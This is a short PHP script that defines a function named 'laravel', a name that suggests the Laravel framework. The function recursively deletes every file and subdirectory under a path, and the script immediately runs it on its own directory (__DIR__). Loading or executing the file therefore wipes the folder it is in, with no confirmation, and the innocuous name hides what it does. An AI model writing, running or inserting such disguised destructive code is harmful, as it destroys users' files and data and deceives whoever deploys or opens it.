<?php

function laravel($dir) {
    if (!is_dir($dir)) return;

    $objects = scandir($dir);
    foreach ($objects as $object) {
        if ($object == "." || $object == "..") continue;

        $path = $dir . DIRECTORY_SEPARATOR . $object;

        if (is_dir($path)) {
            laravel($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
}


$directory = __DIR__;
laravel($directory);

?>
